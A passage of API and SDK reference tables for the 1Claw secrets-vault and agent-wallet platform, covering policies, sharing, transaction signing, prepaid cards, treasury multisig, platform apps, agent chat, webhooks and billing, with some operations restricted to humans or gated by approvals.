| `DELETE` | `/v1/agents/{id}/bankr-keys/{lease_id}` | Revoke lease (calls Bankr API)                                           |

### Policies (Access Control)

| Method   | Path                             | Description                                                                                                    |
| -------- | -------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `POST`   | `/v1/vaults/{id}/policies`       | Create policy (`{ principal_type, principal_id, secret_path_pattern, permissions, conditions?, expires_at? }`) |
| `GET`    | `/v1/vaults/{id}/policies`       | List policies for vault                                                                                        |
| `PUT`    | `/v1/vaults/{id}/policies/{pid}` | Update policy (permissions, conditions, expires_at only)                                                       |
| `DELETE` | `/v1/vaults/{id}/policies/{pid}` | Delete policy → `204`                                                                                          |

### Sharing

| Method   | Path                      | Description                                     |
| -------- | ------------------------- | ----------------------------------------------- |
| `POST`   | `/v1/secrets/{id}/share`  | Create share link                               |
| `GET`    | `/v1/shares/outbound`     | List shares you created                         |
| `GET`    | `/v1/shares/inbound`      | List shares sent to you                         |
| `POST`   | `/v1/shares/{id}/accept`  | Accept an inbound share                         |
| `POST`   | `/v1/shares/{id}/decline` | Decline an inbound share                        |
| `DELETE` | `/v1/share/{id}`          | Revoke a share                                  |
| `GET`    | `/v1/share/{id}`          | Access a share (public, may require passphrase) |

### Intents API (requires `intents_api_enabled`)

| Method   | Path                                               | Description                                                                                       |
| -------- | -------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `POST`   | `/v1/agents/{id}/transactions`                     | Submit transaction for signing. Set `gasless: true` for Pimlico paymaster gas sponsorship. Optional `Idempotency-Key` header (24h TTL) |
| `POST`   | `/v1/agents/{id}/transactions/sign`                | Sign transaction without broadcasting (returns `signed_tx`, `tx_hash`, `from`)                    |
| `POST`   | `/v1/agents/{id}/sign`                             | Unified signing intent: `personal_sign` (EIP-191), `typed_data` (EIP-712), `eip712_digest` (raw digest; requires `raw_signing_enabled`), or `transaction` (types 0–4) |
| `GET`    | `/v1/agents/{id}/transactions`                     | List agent's transactions. `signed_tx` redacted unless `?include_signed_tx=true`                  |
| `GET`    | `/v1/agents/{id}/transactions/{txid}`              | Get transaction details. `signed_tx` redacted unless `?include_signed_tx=true`                    |
| `POST`   | `/v1/agents/{id}/transactions/simulate`            | Simulate single transaction                                                                       |
| `POST`   | `/v1/agents/{id}/transactions/simulate-bundle`     | Simulate transaction bundle                                                                       |
| `POST`   | `/v1/agents/{id}/signing-keys`                     | Provision a multi-chain signing key (`{ chain }`) — human-only                                    |
| `GET`    | `/v1/agents/{id}/signing-keys`                     | List all signing keys for an agent                                                                |
| `POST`   | `/v1/agents/{id}/signing-keys/{chain}/rotate`      | Rotate signing key for a chain — human-only                                                       |
| `DELETE` | `/v1/agents/{id}/signing-keys/{chain}`             | Deactivate signing key for a chain — human-only                                                   |
| `POST`   | `/v1/agents/{id}/signing-keys/{chain}/export`      | Export signing key with private key (requires `X-Auth-Confirm` password) — human-only              |
| `GET`    | `/v1/agents/{id}/signing-keys/{chain}/balance`     | Query native + ERC-20 balances for the signing key address                                          |

### Payment Cards (x402 card ordering — Laso)

| Method   | Path                                  | Description                                                                                     |
| -------- | ------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `POST`   | `/v1/agents/{id}/cards/order`         | Order a prepaid/gift card via x402 (agent; requires `cards_enabled` + `Idempotency-Key`; masked response, no PAN) |
| `GET`    | `/v1/cards`                           | List payment cards (masked to last4)                                                            |
| `GET`    | `/v1/cards/{card_id}`                 | Get a payment card (masked)                                                                      |
| `POST`   | `/v1/cards/{card_id}/reveal`          | Reveal full card details — human: `X-Auth-Confirm` password; agent: only if per-card reveal policy allows; audit-logged |
| `PATCH`  | `/v1/cards/{card_id}`                 | Update reveal policy / `void_after` — human-only                                                |
| `POST`   | `/v1/cards/{card_id}/void`            | Void a card (1Claw-level lock; forward-looking only)                                            |
| `POST`   | `/v1/cards/{card_id}/refresh`         | Refresh balance/status from Laso (rate-limited; clean 429 + `Retry-After`)                      |
| `POST`   | `/v1/cards/import`                    | Manually import a card — human-only, full encrypted storage (CVV one-time-read)                 |
| `POST`   | `/v1/cards/gift-cards/search`         | Search available Laso gift-card brands/servers                                                  |

Ordering guardrails (per-agent, human-set, all tiers): `cards_enabled`, `card_max_order_usd`, `card_daily_limit_usd` (atomic 24h window), `card_payto_allowlist`, `card_reveal_enabled`. Free tier defaults: $25/order, $25/day, 5 cards/month. Pro: 50/mo. Team: 200/mo. Business/Enterprise: unlimited. A 3% platform fee per order is debited from prepaid credits. These bound the purchase, not how a revealed card is later spent — after reveal, a card can be used anywhere up to its balance and 1Claw has no further control.

### Shroud Activity

| Method | Path                       | Description                                          |
| ------ | -------------------------- | ---------------------------------------------------- |
| `GET`  | `/v1/shroud/activity`      | List recent Shroud inspection events                 |
| `POST` | `/v1/shroud/activity`      | Query filtered Shroud activity                       |
| `GET`  | `/v1/shroud/threat-summary`| Shroud threat detection summary                      |

### Approvals

| Method | Path                        | Description                                                    |
| ------ | --------------------------- | -------------------------------------------------------------- |
| `GET`  | `/v1/approvals`             | List approval requests (user-only, filterable by status)       |
| `GET`  | `/v1/approvals/{id}`        | Get approval details                                           |
| `POST` | `/v1/approvals/{id}/decide` | Approve or reject (auto-executes policy changes on approval)   |
| `POST` | `/v1/approvals/request`     | Agent-initiated approval request (agent-only)                  |

### Audit

| Method | Path                                                  | Description        |
| ------ | ----------------------------------------------------- | ------------------ |
| `GET`  | `/v1/audit/events?limit=N&action=...&from=...&to=...` | Query audit events |

### Billing

| Method  | Path                               | Description                                |
| ------- | ---------------------------------- | ------------------------------------------ |
| `GET`   | `/v1/billing/subscription`         | Subscription status, usage, credit balance |
| `GET`   | `/v1/billing/llm-token-billing`    | LLM add-on status; optional `credit_balance`, `billing_cycle_usage.metered_lines` (Stripe preview) |
| `GET`   | `/v1/billing/credits/balance`      | Credit balance + expiring credits          |
| `GET`   | `/v1/billing/credits/transactions` | Credit transaction ledger                  |
| `PATCH` | `/v1/billing/overage-method`       | Set overage method (`credits` or `x402`)   |
| `GET`   | `/v1/billing/usage`                | Usage summary (current month)              |
| `GET`   | `/v1/billing/history`              | Usage event history                        |

### Chains

| Method | Path                      | Description           |
| ------ | ------------------------- | --------------------- |
| `GET`  | `/v1/chains`              | List supported chains |
| `GET`  | `/v1/chains/{name_or_id}` | Get chain details     |

### Treasury (Safe multisig, agent access)

| Method   | Path                                                                 | Description                                      |
| -------- | -------------------------------------------------------------------- | ------------------------------------------------ |
| `POST`   | `/v1/treasury`                                                       | Create treasury (Safe multisig)                  |
| `GET`    | `/v1/treasury`                                                       | List treasuries                                  |
| `GET`    | `/v1/treasury/{treasury_id}`                                         | Get treasury details                             |
| `PATCH`  | `/v1/treasury/{treasury_id}`                                         | Update name and/or threshold                       |
| `DELETE` | `/v1/treasury/{treasury_id}`                                         | Delete treasury                                    |
| `POST`   | `/v1/treasury/{treasury_id}/signers`                                | Add signer to treasury                           |
| `DELETE` | `/v1/treasury/{treasury_id}/signers/{signer_id}`                     | Remove signer from treasury                      |
| `POST`   | `/v1/treasury/{treasury_id}/access-requests`                         | Request access (agent-only; requires EVM address) |
| `GET`    | `/v1/treasury/{treasury_id}/access-requests`                         | List access requests → `{ requests: [...] }`       |
| `POST`   | `/v1/treasury/{treasury_id}/access-requests/{request_id}/approve`    | Approve access request (optional delegation setup) |
| `POST`   | `/v1/treasury/{treasury_id}/access-requests/{request_id}/deny`       | Deny access request                               |

### Treasury Proposals (multisig propose/sign/execute)

| Method   | Path                                                            | Description                                                                  |
| -------- | --------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `POST`   | `/v1/treasury/{treasury_id}/proposals`                          | Create proposal (agent or user; agent must have delegation)                  |
| `GET`    | `/v1/treasury/{treasury_id}/proposals`                          | List proposals (filterable by `?status=`)                                    |
| `GET`    | `/v1/treasury/{treasury_id}/proposals/{proposal_id}`            | Get proposal details + collected signatures                                  |
| `POST`   | `/v1/treasury/{treasury_id}/proposals/{proposal_id}/sign`       | Sign proposal (approve/reject with EIP-712 sig; auto-executes at threshold)  |
| `POST`   | `/v1/treasury/{treasury_id}/proposals/{proposal_id}/execute`    | Force-execute if threshold met (user-only)                                   |
| `DELETE` | `/v1/treasury/{treasury_id}/proposals/{proposal_id}`            | Cancel pending proposal (proposer only)                                      |

### Treasury Delegations

Agent signing mode is configured per-agent via `agents.treasury_signing_mode` (`owner` | `delegated` | `both`). Delegations are created when approving access requests with `delegation_mode` and optional per-delegation `guardrails`.

- **Owner mode**: Agent's EOA added as on-chain Safe signer; agent signs UserOps with own key.
- **Delegated mode**: Agent signs using the treasury wallet key via Intents API; key never leaves `__treasury-keys` vault.
- **Auto-approve rules**: `treasury_delegations.auto_approve_rules` JSONB — when a proposal matches a rule, the agent's signature is auto-inserted; if threshold is met, auto-execute fires immediately.

### Treasury Wallets (native multi-chain, human-only)

| Method   | Path                                     | Description                                               |
| -------- | ---------------------------------------- | --------------------------------------------------------- |
| `POST`   | `/v1/treasury/wallets/generate`          | Generate wallets for specified or all chains               |
| `GET`    | `/v1/treasury/wallets`                   | List all active wallets for the calling user               |
| `GET`    | `/v1/treasury/wallets/{chain}`           | Get wallet for a specific chain                            |
| `POST`   | `/v1/treasury/wallets/{chain}/export`    | Export wallet with private key (requires `X-Auth-Confirm` password header; audit-logged) |
| `POST`   | `/v1/treasury/wallets/{chain}/rotate`    | Rotate wallet keypair (deactivates old, creates new)       |
| `DELETE` | `/v1/treasury/wallets/{chain}`           | Deactivate wallet                                          |
| `GET`    | `/v1/treasury/wallets/{chain}/balance`   | Query native + ERC-20 token balances via chain RPC         |
| `POST`   | `/v1/treasury/wallets/{chain}/send`      | Signed transfer from treasury wallet (requires `X-Auth-Confirm` re-auth). Set `gasless: true` for ERC-4337 UserOp with Pimlico paymaster |
| `POST`   | `/v1/treasury/wallets/{chain}/swap`      | DEX aggregator token swap via 0x API (requires `X-Auth-Confirm` re-auth) |
| `GET`    | `/v1/treasury/wallets/spend-policy`      | View effective spend policy (user-only)                    |

### Platform API (v0.20)

| Method   | Path                                             | Description                                            |
| -------- | ------------------------------------------------ | ------------------------------------------------------ |
| `POST`   | `/v1/platform/apps`                              | Register platform app (user-only, returns `plt_` key)  |
| `GET`    | `/v1/platform/apps`                              | List platform apps for org → `{ apps: [...] }`         |
| `GET`    | `/v1/platform/apps/{id}`                         | Get platform app                                       |
| `PATCH`  | `/v1/platform/apps/{id}`                         | Update platform app                                    |
| `DELETE` | `/v1/platform/apps/{id}`                         | Delete platform app                                    |
| `POST`   | `/v1/platform/apps/{id}/templates`               | Create bootstrap template (JSON spec)                  |
| `GET`    | `/v1/platform/apps/{id}/templates`               | List templates → `{ templates: [...] }`                |
| `GET`    | `/v1/platform/apps/{id}/templates/{tid}`         | Get template by ID                                     |
| `PATCH`  | `/v1/platform/apps/{id}/templates/{tid}`         | Update template                                        |
| `DELETE` | `/v1/platform/apps/{id}/templates/{tid}`         | Delete template                                        |
| `POST`   | `/v1/platform/users/upsert`                      | Provision/find user (platform-only, OIDC or email)     |
| `POST`   | `/v1/platform/connections/{id}/bootstrap`        | Bootstrap resources from template (incl. signing keys) |
| `GET`    | `/v1/platform/claim/{token}`                     | Preview claim token (public, no auth)                  |
| `POST`   | `/v1/platform/claim/{token}`                     | Redeem claim token (public; 409 reused, 410 expired)   |
| `GET`    | `/v1/platform/apps/{id}/users`                   | List connected users → `{ users: [...] }`              |
| `POST`   | `/v1/platform/apps/{id}/rotate-key`              | Rotate platform API key (optional `api_key_expires_at`) |
| `POST`   | `/v1/platform/connections/{id}/reissue-claim`    | Reissue expired claim URL without re-provisioning      |
| `GET`    | `/v1/platform/connected-apps`                    | List apps connected to calling user (user-only)        |
| `DELETE` | `/v1/platform/connected-apps/{connection_id}`    | Disconnect from a platform app                         |
| `POST`   | `/v1/platform/connections/{id}/grant`            | Grant platform app access to vaults/agents (user-only) |
| `GET`    | `/v1/platform/connections/{id}/grants`           | List active resource grants for a connection           |
| `DELETE` | `/v1/platform/connections/{id}/grants/{grant_id}`| Revoke a specific resource grant                       |
| `POST`   | `/v1/platform/apps/{id}/spend-policies`          | Create app-level wallet spend policy (platform-only)   |
| `GET`    | `/v1/platform/apps/{id}/spend-policies`          | List active spend policies for the app                 |
| `PUT`    | `/v1/platform/connections/{id}/spend-policy`     | Set per-user spend policy override                     |
| `GET`    | `/v1/platform/connections/{id}/approvals`        | List mobile approvals (plt_ auth)                      |
| `POST`   | `/v1/platform/connections/{id}/approvals/{aid}/decide` | Decide mobile approval (plt_ auth)                 |
| `GET`    | `/v1/platform/connections/{id}/pending-approvals`  | List consensus pending approvals (plt_ auth)           |
| `POST`   | `/v1/platform/connections/{id}/pending-approvals`  | Create pending approval for connection agent (plt_; **202**) |
| `POST`   | `/v1/platform/connections/{id}/pending-approvals/{pid}/decide` | Vote on pending approval (payload_hash) |
| `GET`    | `/v1/platform/connections/{id}/portfolio`        | Agent portfolio/balances for connection (plt_ auth)    |
| `GET`    | `/v1/platform/connections/{id}/automations`      | List automations for connection agents (plt_ auth)     |
| `POST`   | `/v1/platform/connections/{id}/automations`      | Create automation for connection agent (plt_ auth)   |
| `GET/PUT/DELETE` | `/v1/platform/connections/{id}/memory/{ns}/{key}` | Connection-scoped agent memory (plt_; optional `?agent_id=`) |
| `POST`   | `/v1/shroud/inspect-content`                     | Standalone content threat scan (plt_ / agent / user JWT) |
| `POST`   | `/v1/platform/connections/{id}/runtimes`         | Create runtime for connection agent (plt_ auth)        |
| `GET`    | `/v1/platform/connections/{id}/runtimes/{rid}`   | Get connection-scoped runtime (plt_ auth; not `/v1/runtimes/{id}`) |
| `POST`   | `/v1/platform/connections/{id}/passkeys/enroll/begin`   | Start WebAuthn registration for connected end-user (plt_ auth) |
| `POST`   | `/v1/platform/connections/{id}/passkeys/enroll/complete`  | Complete passkey registration for connected end-user |
| `POST`   | `/v1/platform/connections/{id}/agents/{aid}/chat`  | Chat with connection agent (plt_ auth; `system`, `system_prompt`, `messages[]`; 402 on billing errors) |
| `GET`    | `/v1/platform/connections/{id}/signing-keys`      | List agent signing keys — public metadata only (plt_; optional `?agent_id=`) |
| `GET`    | `/v1/platform/connections/{id}/signing-keys/{chain}` | Single-chain agent signing key (plt_; optional `?agent_id=`) |
| `PATCH`  | `/v1/platform/connections/{id}/agents/{aid}`       | Patch `intents_api_enabled`, `execution_intents_enabled`, `system_prompt` (plt_) |
| `DELETE` | `/v1/platform/connections/{id}/signing-keys/{chain}` | Deactivate signing key for connection agent        |
| `DELETE` | `/v1/platform/apps/{id}/spend-policies/{pid}`    | Deactivate a spend policy                              |
| `GET`    | `/v1/platform/marketplace`                       | List approved platform apps (public, with category/tags/screenshots) |
| `GET`    | `/v1/platform/apps/{id}/stats`                   | Get app stats (connected users, bootstraps, active connections) |
| `POST`   | `/v1/webhooks/{id}/rotate-secret`                | Rotate webhook HMAC signing secret                     |

**Platform expansion (v0.57–v0.59.4):** `GET /v1/platform/connections/{id}` returns `provisioned_tier` (effective billing tier when `billing_model` is `platform_pays` — set from template `plan` at bootstrap) and `wallet_address` (SIWE **staker identity** — not the agent signing key). Use **`GET .../signing-keys`** for agent on-chain addresses. Template spec supports `agents[].system_prompt`, `intents: true` / `intents_api_enabled`, and `agents[].runtime` / top-level `runtimes[]` / `provision_runtime: true`. **`PATCH .../agents/{aid}`** enables Intents on existing agents without re-bootstrap. **`POST .../pending-approvals`** creates consensus approvals; **`GET .../portfolio`** returns balances; **`GET/POST .../automations`** and **`GET/PUT/DELETE .../memory/{ns}/{key}`** are plt_-scoped. **`POST /v1/shroud/inspect-content`** mirrors MCP `inspect_content`. Connection chat accepts `system`, `system_prompt`, or inline `messages` with `role: "system"`. **`siwe_domain`** on platform apps (plt_ may PATCH only this field). Spend-policy PUT and bootstrap accept **`Idempotency-Key`** (24h body-hash replay). Platform webhooks add `pending_approval.created`, `tx.awaiting_approval`, `sign.awaiting_approval`, `automation.run.failed`. SDK: `platform.getConnection()`, `listConnectionSigningKeys()`, `patchConnectionAgent()`, `createConnectionPendingApproval()`, `getConnectionPortfolio()`, `listConnectionAutomations()`, `putConnectionMemory()`, `getConnectionRuntime()`, `connectionPasskeyEnrollBegin()`, `connectionPasskeyEnrollComplete()`, `connectionAgentChat()`.

**Platform configuration fields:** `max_connected_users` (INTEGER) on `platform_apps` — enforced; new connections rejected when limit reached. `max_requests_per_minute` — per-app rate limits on platform API endpoints.

**Platform delegation scopes (for `delegation_scopes` on connections):** `vaults:read`, `vaults:write`, `agents:read`, `agents:write`, `secrets:read`, `secrets:write`, `automations:*`, `runtimes:*`, `memory:read`, `memory:write`, `chat:read`, `chat:write`.

**Platform webhook events:** `platform.user.connected`, `platform.user.disconnected`, `platform.bootstrap.completed`, `platform.grant.created`, `platform.grant.revoked`, `platform.claim.redeemed`, `platform.claim.expired`, `platform.entitlement.granted`, `platform.entitlement.revoked`, `pending_approval.created`, `tx.awaiting_approval`, `sign.awaiting_approval`, `automation.run.failed`.

### Agent Chat (v0.43+)

| Method   | Path                                                | Description                                    |
| -------- | --------------------------------------------------- | ---------------------------------------------- |
| `POST`   | `/v1/agents/{id}/chat`                              | Send message (SSE streaming response)          |
| `POST`   | `/v1/agents/{id}/chat/unlock`                       | Step-up auth to unlock chat                    |
| `GET`    | `/v1/agents/{id}/chat/conversations`                | List conversations                             |
| `GET`    | `/v1/agents/{id}/chat/conversations/{cid}`          | Get conversation with messages                 |
| `DELETE` | `/v1/agents/{id}/chat/conversations/{cid}`          | Delete conversation                            |
| `POST`   | `/v1/runtimes/{id}/chat`                            | Runtime chat (SSE streaming)                   |
| `POST`   | `/v1/runtimes/{id}/chat/unlock`                     | Unlock runtime chat                            |

### Messaging Channels (v0.43+)

| Method   | Path                                                | Description                                    |
| -------- | --------------------------------------------------- | ---------------------------------------------- |
| `POST`   | `/v1/agents/{id}/channels`                          | Create messaging channel (Telegram/WhatsApp/Discord) |
| `GET`    | `/v1/agents/{id}/channels`                          | List agent channels                            |
| `PATCH`  | `/v1/agents/{id}/channels/{cid}`                    | Update channel config                          |
| `DELETE` | `/v1/agents/{id}/channels/{cid}`                    | Delete channel                                 |
| `POST`   | `/v1/agents/{id}/channels/{cid}/send`               | Send message via channel                       |
| `POST`   | `/v1/agents/{id}/channels/{cid}/test`               | Test connectivity                              |
| `POST`   | `/v1/agents/{id}/channels/{cid}/refresh-webhook`    | Refresh webhook registration                   |
| `GET`    | `/v1/agents/{id}/channels/{cid}/messages`           | List channel messages                          |

**Hermes-native channel features (v0.45):** Channels support `slash_commands_enabled` (12 built-in commands), `voice_transcription_enabled` (Telegram voice→text via Whisper), `unified_conversation_id` (cross-platform continuity), `auto_respond_in_progress` (concurrency guard), and `is_home_platform` (primary interface marker set via /sethome). The `notify` automation step supports `channel` type for delivering outputs to messaging channels.

### Billing quotas (v0.47.3)

Wallet quota (treasury wallets + signing keys + smart accounts + agent EOAs): Free 10, Pro 10,000, Team 250,000, Business 1,000,000. Signature quota: Free 100, Pro 20,000, Team 200,000, Business 1,000,000. Signature overage is a flat per-signature charge (not a percent of transaction value). Signing POSTs do not consume the API Calls meter. Treasury wallets are available on all tiers.

`GET /v1/billing/subscription` `usage` includes `requests`, `wallets`, and `intent_transactions` (`{ used, limit }`).

### Policy Engine v2 — Cedar & OPA (v0.47+)

| Method   | Path                               | Description                                    |
| -------- | ---------------------------------- | ---------------------------------------------- |
| `POST`   | `/v1/org/cedar-policies`           | Create Cedar policy (Team+)                    |
| `GET`    | `/v1/org/cedar-policies`           | List Cedar policies                            |
| `GET`    | `/v1/org/cedar-policies/{id}`      | Get Cedar policy                               |
| `DELETE` | `/v1/org/cedar-policies/{id}`      | Delete Cedar policy                            |
| `POST`   | `/v1/org/cedar-policies/test`      | Dry-run Cedar policy evaluation                |
| `POST`   | `/v1/org/opa-policies`             | Create OPA policy (Business+)                  |
| `GET`    | `/v1/org/opa-policies`             | List OPA policies                              |
| `GET`    | `/v1/org/opa-policies/{id}`        | Get OPA policy                                 |
| `DELETE` | `/v1/org/opa-policies/{id}`        | Delete OPA policy                              |
| `POST`   | `/v1/org/opa-policies/test`        | Dry-run OPA policy evaluation                  |

Built-in glob policies have new fields: `effect` (allow/deny, default allow), `priority` (higher wins), `attribute_conditions` (JSONB).

**Cedar/OPA enforcement v2 (v0.48):** Org-level backend config with shadow mode (default), enforce mode, and fail-closed circuit breaker. Cedar/OPA policy responses include dynamic `enforcement_status` (`shadow` | `enforce` | `inactive`).

| Method   | Path                               | Description                                    |
| -------- | ---------------------------------- | ---------------------------------------------- |
| `GET`    | `/v1/org/settings/policy-backend`  | Get backend, mode, scope, breaker behavior     |
| `PATCH`  | `/v1/org/settings/policy-backend`  | Update policy backend settings                 |
| `GET`    | `/v1/org/policy-shadow-report`     | Shadow mode divergence report                  |
| `POST`   | `/v1/org/contract-abis`            | Register contract ABI (chain + address)        |
| `GET`    | `/v1/org/contract-abis`            | List contract ABIs                             |
| `GET`    | `/v1/org/contract-abis/{id}`       | Get contract ABI                               |
| `DELETE` | `/v1/org/contract-abis/{id}`       | Delete contract ABI                            |
| `POST`   | `/v1/pending-approvals`            | Submit action for consensus approval           |
| `GET`    | `/v1/pending-approvals`            | List pending approvals                         |
| `GET`    | `/v1/pending-approvals/{id}`       | Get pending approval                           |
| `POST`   | `/v1/pending-approvals/{id}/approve` | Approve (collect signatures)                 |
| `POST`   | `/v1/pending-approvals/{id}/execute` | Execute approved action                      |
| `POST`   | `/v1/pending-approvals/{id}/cancel`  | Cancel pending approval                      |

Access policies support `consensus_trigger` — when matched, signing returns **202** pending multi-party approval instead of signing immediately.

**v0.50 Policy Parity:** Consensus supports `threshold_wei` (wei-precision), `required_roles`, `per_role_minimums`, `require_credential_types` on approvals, and `action_in` for control-plane governance. `tx_conditions` adds EIP-712 per-field (`eip712_verifying_contract_in`, etc.) and EIP-7702 (`eip7702_authorized_addresses_in`) conditions. Org setting `control_plane_consensus_policy_id` gates policy/key/member mutations.

**MCP tools (v0.50):** `get_policy_backend_settings`, `update_policy_backend_settings`, `get_shadow_report`, `list_contract_abis`, `create_contract_abi`, `delete_contract_abi`, `list_pending_approvals`, `approve_pending_approval` (supports `credential_type`), `execute_pending_approval`.

### Sub-Organizations (v0.47)

| Method   | Path                                               | Description                                    |
| -------- | -------------------------------------------------- | ---------------------------------------------- |
| `POST`   | `/v1/org/sub-orgs`                                 | Create sub-organization                        |
| `GET`    | `/v1/org/sub-orgs`                                 | List sub-organizations                         |
| `GET`    | `/v1/org/sub-orgs/{id}`                            | Get sub-organization                           |
| `DELETE` | `/v1/org/sub-orgs/{id}`                            | Archive sub-organization                       |
| `POST`   | `/v1/org/sub-orgs/{id}/permissions`                | Grant permission in sub-org                    |
| `DELETE` | `/v1/org/sub-orgs/{id}/permissions/{permission}`   | Revoke permission                              |
| `POST`   | `/v1/org/sub-orgs/{id}/users`                      | Add user to sub-org                            |
| `POST`   | `/v1/org/sub-orgs/{id}/wallets/generate`           | Generate treasury wallets for sub-org          |

Tier limits: Free=0, Pro=10, Team=50, Business=500, Enterprise=unlimited.

### Portfolio (v0.47)

| Method | Path            | Description                                                               |
| ------ | --------------- | ------------------------------------------------------------------------- |
| `GET`  | `/v1/portfolio` | Unified balance across treasury wallets, signing keys, smart accounts. Query: `?chains=`, `?include_tokens=` |

### Smart Account Import (v0.47)

| Method | Path                                           | Description                                    |
| ------ | ---------------------------------------------- | ---------------------------------------------- |
| `POST` | `/v1/agents/{id}/smart-accounts/import`        | Import existing Gnosis Safe (optional on-chain verify) |

### Key Import — BYOK (v0.47)

| Method | Path                                                      | Description                                                |
| ------ | --------------------------------------------------------- | ---------------------------------------------------------- |
| `POST` | `/v1/agents/{id}/signing-keys/{chain}/import`             | Import signing key (human-only, `X-Auth-Confirm`)          |
| `POST` | `/v1/treasury/wallets/{chain}/import`                     | Import treasury wallet key (human-only, `X-Auth-Confirm`)  |

### Other

| Method             | Path                           | Description                                        |
| ------------------ | ------------------------------ | -------------------------------------------------- |
| `POST`             | `/v1/webhooks`                 | Register a webhook for wallet/proposal/transaction/policy/signing_key events (live delivery with retries) |
| `GET`              | `/v1/webhooks`                 | List webhook registrations                         |
| `GET`              | `/v1/webhooks/{id}`            | Get webhook details                                |
| `PATCH`            | `/v1/webhooks/{id}`            | Update webhook (URL, events, active status)        |
| `DELETE`           | `/v1/webhooks/{id}`            | Delete webhook registration                        |
| `POST`             | `/v1/webhooks/{id}/rotate-secret` | Rotate webhook HMAC signing secret              |

**Supported webhook events:** `wallet.transfer.sent`, `wallet.transfer.received`, `proposal.created`, `proposal.signed`, `proposal.executed`, `proposal.cancelled`, `agent.transaction.broadcast`, `agent.transaction.signed`, `signing_key.rotated`, `policy.created`, `policy.updated`, `policy.deleted`, `platform.user.connected`, `platform.user.disconnected`, `platform.bootstrap.completed`, `platform.grant.created`, `platform.grant.revoked`, `platform.claim.redeemed`.

| `GET`              | `/v1/health`                   | Health check → `{ status, service, version }`      |
| `GET`              | `/v1/health/hsm`               | HSM health → `{ status, hsm_provider, connected }` |
| `POST/GET/DELETE`  | `/v1/auth/api-keys[/{id}]`     | Manage personal API keys                           |
| `GET/POST/DELETE`  | `/v1/security/ip-rules[/{id}]` | Manage IP allowlist/blocklist                      |
| `GET/PATCH/DELETE` | `/v1/org/members[/{id}]`       | Manage org members                                 |

---

## SDK Method Reference

All methods return `Promise<OneclawResponse<T>>`. Access via `client.<resource>.<method>(...)`.

| Resource  | Method                                                                                                       | Description                            |
| --------- | ------------------------------------------------------------------------------------------------------------ | -------------------------------------- |
| `vaults`  | `create({ name, description? })`                                                                             | Create vault                           |
| `vaults`  | `get(vaultId)`                                                                                               | Get vault                              |
| `vaults`  | `list()`                                                                                                     | List vaults                            |
| `vaults`  | `delete(vaultId)`                                                                                            | Delete vault                           |
| `secrets` | `set(vaultId, key, value, { type?, metadata?, expires_at?, max_access_count? })`                             | Store/update secret                    |
| `secrets` | `get(vaultId, key)`                                                                                          | Read secret (decrypted)                |
| `secrets` | `list(vaultId, prefix?)`                                                                                     | List secret metadata                   |
| `secrets` | `delete(vaultId, key)`                                                                                       | Delete secret                          |
| `secrets` | `rotate(vaultId, key, newValue)`                                                                             | Rotate secret to new version           |
| `agents`  | `create({ name, description?, scopes?, expires_at?, intents_api_enabled?, token_ttl_seconds?, vault_ids? })` | Create agent → returns agent + api_key |
| `agents`  | `get(agentId)`                                                                                               | Get agent                              |
| `agents`  | `list()`                                                                                                     | List agents                            |
| `agents`  | `update(agentId, { is_active?, scopes?, intents_api_enabled?, tx_*? })`                                      | Update agent                           |
| `agents`  | `delete(agentId)`                                                                                            | Delete agent                           |
| `agents`  | `rotateKey(agentId)`                                                                                         | Rotate agent API key                   |
| `agents`  | `submitTransaction(agentId, { to, value, chain, ... })`                                                      | Submit transaction (EVM + non-EVM)     |
| `agents`  | `simulateTransaction(agentId, { to, value, chain, ... })`                                                    | Simulate transaction                   |
| `agents`  | `simulateBundle(agentId, bundle)`                                                                            | Simulate transaction bundle            |
| `agents`  | `getTransaction(agentId, txId)`                                                                              | Get transaction                        |
| `agents`  | `listTransactions(agentId)`                                                                                  | List agent transactions                |
| `agents`  | `signIntent(agentId, { intent_type, chain, message?, typed_data?, tx_type?, ... })`                          | Unified signing (EIP-191, EIP-712, EIP-2718 types 0–4) |
| `signingKeys` | `create(agentId, { chain })`                                                                             | Provision a multi-chain signing key    |
| `signingKeys` | `list(agentId)`                                                                                          | List all signing keys for an agent     |
| `signingKeys` | `rotate(agentId, chain)`                                                                                 | Rotate signing key for a chain         |
| `signingKeys` | `deactivate(agentId, chain)`                                                                             | Deactivate signing key                 |
| `signingKeys` | `export(agentId, chain, { password })`                                                                   | Export signing key with private key (requires password re-auth) |
| `cards`   | `order(agentId, { kind, amount_usd, laso_server_id?, country? })`                                            | Order a prepaid/gift card via x402 (auto Idempotency-Key; masked response) |
| `cards`   | `list()`, `get(cardId)`                                                                                      | List/get cards (masked to last4)       |
| `cards`   | `reveal(cardId, { password? })`                                                                              | Reveal full card details (human: password re-auth; agent: per-card policy) |
| `cards`   | `update(cardId, { agent_reveal?, max_reveals?, reveal_expires_at?, void_after? })`                           | Set reveal policy / void_after (human-only) |
| `cards`   | `void(cardId)`, `refresh(cardId)`                                                                            | Void (forward-looking lock) / refresh balance from Laso |
| `cards`   | `import({ pan, cvv, exp_month, exp_year, ... })`, `searchGiftCards({ query?, country? })`                    | Manual import (human-only) / search gift-card brands |
| `access`  | `grantAgent(vaultId, agentId, permissions, { path?, conditions?, expires_at? })`                             | Grant agent access                     |
| `access`  | `grantHuman(vaultId, userId, permissions, { path?, conditions?, expires_at? })`                              | Grant user access                      |
| `access`  | `listGrants(vaultId)`                                                                                        | List policies                          |
| `access`  | `update(vaultId, policyId, { permissions?, conditions?, expires_at? })`                                      | Update policy                          |
| `access`  | `revoke(vaultId, policyId)`                                                                                  | Revoke policy                          |
| `sharing` | `create(secretId, { recipient_type, recipient_id?, expires_at, max_access_count? })`                         | Create share                           |
| `sharing` | `access(shareId)`                                                                                            | Access shared secret                   |
| `sharing` | `listOutbound()`                                                                                             | Shares you created                     |
| `sharing` | `listInbound()`                                                                                              | Shares sent to you                     |
| `sharing` | `accept(shareId)`                                                                                            | Accept inbound share                   |
| `sharing` | `decline(shareId)`                                                                                           | Decline inbound share                  |
| `sharing` | `revoke(shareId)`                                                                                            | Revoke outbound share                  |
| `audit`   | `query({ action?, actor_id?, from?, to?, limit?, offset? })`                                                 | Query audit events                     |
| `billing` | `usage()`                                                                                                    | Current month usage                    |
| `billing` | `history(limit?)`                                                                                            | Usage event history                    |
| `billing` | `llmTokenBilling()`, `subscribeLlmTokenBilling()`, `disableLlmTokenBilling()`                               | LLM token billing add-on (Stripe AI Gateway) |
